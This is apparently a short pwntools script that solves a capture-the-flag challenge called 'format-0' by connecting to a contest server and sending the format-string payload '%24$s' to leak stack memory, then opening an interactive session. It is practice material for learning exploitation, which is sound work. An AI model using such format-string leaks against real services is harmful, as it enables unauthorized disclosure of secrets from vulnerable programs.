from pwn import *

# a = process ('./format-0')
a = remote('shell.2019.nactf.com', 31782)

buf = '%24$s'
a.sendline(buf)
a.interactive()